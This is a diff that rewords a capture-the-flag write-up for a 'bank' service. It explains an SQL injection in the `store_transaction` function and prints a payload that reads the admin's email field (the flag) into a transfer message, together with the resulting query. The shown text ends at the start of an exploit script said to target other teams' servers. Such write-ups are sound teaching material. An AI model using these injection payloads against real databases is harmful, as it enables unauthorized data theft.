@@ -1,23 +1,26 @@
 Bank writeup
 ===========
 ### Vulnerability
-There is SQL injection vulnerability in bank system. \
-The vulnerability originates from functions in `db/utils.py`: `get_account_num`,
-`get_balance`, and `store_transaction`. \
-They can be spotted by diffing the source codes.
+There is a SQL injection vulnerability in bank system. \
+The vulnerability originates from functions in `db/utils.py`: \
+`get_account_num`,`get_balance`, and `store_transaction`. \
+These functions can be spotted by diffing the source codes.
 
-First two functions seem hard to be exploited as the arguments are user ID,
-which leaves me one and only readily-feasible vulnerable function.
+The first two functions seem hard to be exploited \
+because the arguments are user IDs,\
+and this leaves us one and only readily-feasible vulnerable function, \
+`store_transaction`.
 
 ### Payload
-The plan is to insert the flag which resides in the email field of admin into 
-transfer message so that we can check the flag in transaction history.
-Therefore we put the following payload in transfer message:
+The attack strategy is to insert the flag which resides in the email \
+field of admin into transfer message so that we can check the flag in \
+transaction history.
+Therefore, we put the following payload in the transfer message:
 
 ```
 ',(SELECT email FROM user_table LIMIT 1)),0,0),(1,1,1,('1
 ```
-which results in complete SQL query:
+which results in the following complete SQL query:
 ```sql
 INSERT INTO `tran_table`(`from_account`, `to_account`, `remit`, `msg`,
     `from_balance`, `to_balance`)
@@ -26,7 +29,7 @@ VALUES(%s, %s, %s, concat ('[Transfer] ', '',(SELECT email FROM user_table
 ```
 
 ### Full Exploit Code
-The following exploit code exploits all other team's servers.
+The following exploit code exploits all other teams' bank servers.
 ```python
 # '^[A-za-z0-9\.\,_\(\)\' ]{,100}$'
 import socket
